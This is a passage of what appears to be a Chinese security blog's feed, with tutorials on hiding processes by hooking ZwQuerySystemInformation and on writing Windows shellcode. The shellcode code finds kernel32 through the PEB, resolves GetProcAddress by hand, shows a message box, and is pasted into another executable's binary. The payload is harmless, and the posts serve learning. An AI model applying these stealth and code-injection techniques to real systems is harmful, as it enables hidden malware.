src="/2021/07/28/HOOK-Inline%20Hook/8.png"></p><p>当注入成功后，内容更改</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/9.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。</p>]]></content>
    
    
    <categories>
      
      <category>HOOK技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>Inline Hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-进程隐藏</title>
    <link href="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    <url>/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。</p><p>实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。</p><p>可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数</p><p><img src="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/1.png"></p><p>在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。</p><p>这需要用到Inline Hook，关于Inline Hook看这里</p><p><a href="https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/">HOOK-Inline Hook</a></p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>ZwQuerySystemInformation</p><p>获取指定的系统信息</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf">NTSTATUS WINAPI ZwQuerySystemInformation(<br>  <span class="hljs-variable">_In_</span>      SYSTEM_INFORMATION_CLASS SystemInformationClass,<br>  <span class="hljs-variable">_Inout_</span>   PVOID                    SystemInformation,<br>  <span class="hljs-variable">_In_</span>      ULONG                    SystemInformationLength,<br>  <span class="hljs-variable">_Out_opt_</span> PULONG                   ReturnLength<br>);<br></code></pre></div></td></tr></table></figure><p>SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。</p><p>SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。</p><p>SystemInformationLength：SystemInformation指向缓冲区的大小。</p><p>ReturnLength：指向函数写入请求信息的实际大小的位置。</p><p>返回值：返回NTSTATUS成功或错误代码。</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode学习</title>
    <link href="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="shellcode学习"><a href="#shellcode学习" class="headerlink" title="shellcode学习"></a>shellcode学习</h3><h4 id="编译器的一些设置"><a href="#编译器的一些设置" class="headerlink" title="编译器的一些设置"></a>编译器的一些设置</h4><h5 id="第一步修改入口点"><a href="#第一步修改入口点" class="headerlink" title="第一步修改入口点"></a>第一步修改入口点</h5><p>在编译器中修改程序的入口点，写代码时就可以使用新的入口点名</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/1.png"></p><p>修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/2.png"></p><h5 id="第二步关闭缓冲区安全检查"><a href="#第二步关闭缓冲区安全检查" class="headerlink" title="第二步关闭缓冲区安全检查"></a>第二步关闭缓冲区安全检查</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/3.png"></p><p>然后查看IDA，左边函数只剩一个了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/4.png"></p><h5 id="第三步设置工程兼容XP"><a href="#第三步设置工程兼容XP" class="headerlink" title="第三步设置工程兼容XP"></a>第三步设置工程兼容XP</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/5.png"></p><p>修改运行库为MT</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/6.png"></p><h5 id="第四步关闭生成清单"><a href="#第四步关闭生成清单" class="headerlink" title="第四步关闭生成清单"></a>第四步关闭生成清单</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/7.png"></p><p>使用loadpe查看看到只有两个区段</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/8.png"></p><h5 id="第五步关闭调试信息"><a href="#第五步关闭调试信息" class="headerlink" title="第五步关闭调试信息"></a>第五步关闭调试信息</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/9.png"></p><h4 id="shellcode编写原则1"><a href="#shellcode编写原则1" class="headerlink" title="shellcode编写原则1"></a>shellcode编写原则1</h4><ul><li>杜绝双引号字符串的直接使用</li><li>关闭VS自动优化没有使用到的变量</li><li>自定义函数入口</li></ul><p>#pragma comment(linker,”/entry:EntryMain”)</p><h4 id="shellcode编写原则2"><a href="#shellcode编写原则2" class="headerlink" title="shellcode编写原则2"></a>shellcode编写原则2</h4><p>动态获取函数地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in UINT uType)</span></span>;<br>    FN_MessageBoxA fn_MessageBoxA;<br>    fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    fn_MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>, <span class="hljs-string">&quot;hhh&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则3"><a href="#shellcode编写原则3" class="headerlink" title="shellcode编写原则3"></a>shellcode编写原则3</h4><p>获取kernel32.dll基址和GetProcAddress地址获取。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ucrtd.lib&quot;</span>) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;msvcrtd.lib&quot;) </span><br><span class="hljs-comment">//#pragma comment(lib, &quot;vcruntimed.lib&quot;) </span><br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax,[eax+<span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret <br>&#125;<br>&#125;<br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br><br><br><br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br><br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + <br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span> *lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span>&amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br><span class="hljs-comment">//PWORD </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则4"><a href="#shellcode编写原则4" class="headerlink" title="shellcode编写原则4"></a>shellcode编写原则4</h4><ul><li><p>避免全局变量的使用</p></li><li><p>确保已加载所使用的API的动态链接库</p></li></ul><h4 id="第一种shellcode生成框架"><a href="#第一种shellcode生成框架" class="headerlink" title="第一种shellcode生成框架"></a>第一种shellcode生成框架</h4><p>通过上述操作直接编写，编写一个拥有弹窗功能的shellcode</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span></span>;<br>FARPROC _GetProcAddress(HMODULE hModule);<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>HMODULE hAddr = (HMODULE)getKernel32();<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* FN_GetProcAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>FN_GetProcAddress fn_GetProcAddress;<br>fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr);<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* FN_LoadLibraryA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPCSTR lpLibFileName)</span></span>;<br><span class="hljs-keyword">char</span> szLoadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_LoadLibraryA fn_LoadLibraryA = (FN_LoadLibraryA)fn_GetProcAddress(hAddr, szLoadLibraryA);<br><span class="hljs-keyword">char</span> szMessageBoxA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT uType)</span></span>;<br><span class="hljs-keyword">char</span> szUser32[] = &#123; <span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>FN_MessageBoxA fn_MessageBoxA = (FN_MessageBoxA)fn_GetProcAddress(fn_LoadLibraryA(szUser32), szMessageBoxA);<br><span class="hljs-keyword">char</span> szHello[] = &#123; <span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szTitle[] = &#123; <span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br>fn_MessageBoxA(<span class="hljs-literal">NULL</span>, szHello, szTitle, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>_declspec(naked) <span class="hljs-function">DWORD <span class="hljs-title">getKernel32</span><span class="hljs-params">()</span> </span>&#123;<br>__asm &#123;<br>mov eax, fs: [<span class="hljs-number">30</span>h]<span class="hljs-comment">//获取PEB</span><br>mov eax, [eax + <span class="hljs-number">0</span>Ch]<span class="hljs-comment">//获取_PEB_LDR_DATA</span><br>mov eax, [eax + <span class="hljs-number">14</span>h]<span class="hljs-comment">//InMemoryOrderModuleList，</span><br>mov eax, [eax]<span class="hljs-comment">//程序自身</span><br>mov eax, [eax]<span class="hljs-comment">//ntdll.dll</span><br>mov eax, [eax + <span class="hljs-number">10</span>h]<span class="hljs-comment">//kernel.dll,偏移10H是地址</span><br>ret<br>&#125;<br>&#125;<br><br>FARPROC _GetProcAddress(HMODULE hModule) &#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader +<br>(DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames);<br>PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals);<br>PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions);<br>DWORD dwNumber = lpExport-&gt;NumberOfNames;<br>DWORD wHint = <span class="hljs-number">0</span>;<br>FARPROC lpFunc;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwNumber; i++) &#123;<br><span class="hljs-keyword">char</span>* lpFuncName = (<span class="hljs-keyword">char</span>*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (lpFuncName[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;P&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;o&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp;<br>lpFuncName[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;s&#x27;</span>) &#123;<br>wHint = lpAddressOfNameOrdinalArray[i];<br>lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后使用PEID查看偏移，可以看到是200,</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/10.png"></p><p>然后使用十六进制编辑器将其中的机器码拷贝出来。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/11.png"></p><p>选取一个替代的程序，查看其偏移</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/12.png"></p><p>然后进入编辑器，从偏移开始粘贴我们的机器码</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/13.png"></p><p>然后打开这个程序就会实现shellcode编写的弹窗效果了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/14.png"></p><h4 id="第二种shellcode生成框架"><a href="#第二种shellcode生成框架" class="headerlink" title="第二种shellcode生成框架"></a>第二种shellcode生成框架</h4><h5 id="单文件的函数生成位置规律"><a href="#单文件的函数生成位置规律" class="headerlink" title="单文件的函数生成位置规律"></a>单文件的函数生成位置规律</h5><p>单文件的函数生成规律，与函数实现的先后顺序有关，与定义的顺序无关。</p><p>如这样一个程序，定义的顺序是先A，后B</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/15.png"></p><p>在IDA中可以看到顺序是先B后A。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/16.png"></p><h5 id="多文件生成规律"><a href="#多文件生成规律" class="headerlink" title="多文件生成规律"></a>多文件生成规律</h5><p>与包含的文件位置无关，与实际调用顺序有关。</p><p>在文件中的.vcxproj文件，如图此时是这个顺序，可以看到编译顺序一致。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/17.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/18.png"></p><p>修改一下顺序，编译顺序也会改变</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/19.png"></p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/20.png"></p><h5 id="实际编写"><a href="#实际编写" class="headerlink" title="实际编写"></a>实际编写</h5><p>在其中定义几个文件</p><ul><li>0.entry.cpp：入口点</li><li>a.start.cpp：shellcode执行</li><li>z.end.cpp：shellcode结束</li></ul><p>a-z之间可以放shellcode的所有功能的具体实现。在0.entry中写创建文件，根据文件的生成规律，可以知道文件的大小就是a.start.cpp中的ShellcodeEnd - z.end.cpp中的ShellcodeStart。</p><figure class="highlight 